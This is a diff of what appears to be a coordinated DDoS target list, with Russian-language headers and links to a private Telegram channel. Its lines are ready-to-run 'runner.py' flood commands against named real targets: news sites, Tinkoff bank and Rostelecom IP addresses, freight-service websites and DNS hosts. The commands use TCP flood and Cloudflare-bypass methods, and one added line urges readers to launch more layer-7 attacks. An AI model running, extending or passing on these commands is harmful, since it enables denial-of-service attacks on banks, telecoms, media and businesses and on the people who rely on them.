@@ -1,14 +1,20 @@
 ### rusvesna.su https://t.me/c/1624648668/87
-#runner.py http://rusvesna.su/ http://m.rusvesna.su/ -t 1000 -p 3600 --rpc 50 --http-methods CFB --debug
+#runner.py http://rusvesna.su/ http://m.rusvesna.su/ -t 1000 -p 3600 --rpc 50 --http-methods CFB
 
 ### smotrim.ru https://t.me/c/1624648668/85
-runner.py tcp://80.249.129.244:443 tcp://80.249.129.244:80 -t 1000 -p 3600 --rpc 50 --http-methods TCP FLOOD --debug
+runner.py tcp://80.249.129.244:443 tcp://80.249.129.244:80 -t 1000 -p 3600 --rpc 50 --http-methods TCP FLOOD
 
 ### тинькофф https://t.me/c/1624648668/89
-runner.py tcp://92.223.84.84:80 tcp://92.223.84.84:443 tcp://91.194.226.50:80 tcp://91.194.226.50:443 tcp://78.46.94.184:80 tcp://78.46.94.184:443 tcp://46.4.106.111:80 tcp://46.4.106.111:443 tcp://91.194.226.32:80 tcp://91.194.226.32:443 tcp://91.194.226.22:80 tcp://91.194.226.22:443 tcp://91.194.226.15:80 tcp://91.194.226.15:443 tcp://91.194.226.6:80 tcp://91.194.226.6:443 -t 1000 -p 3600 --rpc 50 --http-methods TCP FLOOD --debug
+#runner.py tcp://92.223.84.84:80 tcp://92.223.84.84:443 tcp://91.194.226.50:80 tcp://91.194.226.50:443 tcp://78.46.94.184:80 tcp://78.46.94.184:443 tcp://46.4.106.111:80 tcp://46.4.106.111:443 tcp://91.194.226.32:80 tcp://91.194.226.32:443 tcp://91.194.226.22:80 tcp://91.194.226.22:443 tcp://91.194.226.15:80 tcp://91.194.226.15:443 tcp://91.194.226.6:80 tcp://91.194.226.6:443 -t 1000 -p 3600 --rpc 50 --http-methods TCP FLOOD
 
 ### ростелеком https://t.me/c/1624648668/92
-#runner.py tcp://87.226.162.181:80 tcp://87.226.162.181:443 tcp://87.226.162.53:80 tcp://87.226.162.53:443 tcp://95.167.23.6:80 tcp://95.167.23.6:443 -t 1000 -p 3600 --rpc 50 --http-methods TCP FLOOD --debug
+#runner.py tcp://87.226.162.181:80 tcp://87.226.162.181:443 tcp://87.226.162.53:80 tcp://87.226.162.53:443 tcp://95.167.23.6:80 tcp://95.167.23.6:443 -t 1000 -p 3600 --rpc 50 --http-methods TCP FLOOD
 
 ###Везёт всем - онлайн-сервис по грузоперевозкам.
-runner.py https://www.vezetvsem.ru/ -t 1000 -p 300 --rpc 100 --http-methods CFB --debug
+runner.py https://www.vezetvsem.ru/ -t 1000 -p 300 --rpc 100 --http-methods CFB
+
+### На связи Украинский Жнец, нашли DNS-хосты ati.su
+runner.py tcp://139.45.252.51:80 tcp://139.45.252.51:443 tcp://139.45.252.52:443 tcp://139.45.252.22:80 tcp://139.45.252.22:443 tcp://139.45.252.21:80 tcp://193.232.146.1:53 tcp://91.217.21.1:53 tcp://91.217.20.1:53 -t 1000 -p 300 --rpc 100 --http-methods TCP FLOOD
+
+### У кого есть возможность запустить ещё атаку, на 7 уровне можно лупить https://groozgo.ru/ сквозь Cloudflare:
+runner.py https://groozgo.ru/ -t 1000 -p 300 --rpc 100 --http-methods CFB
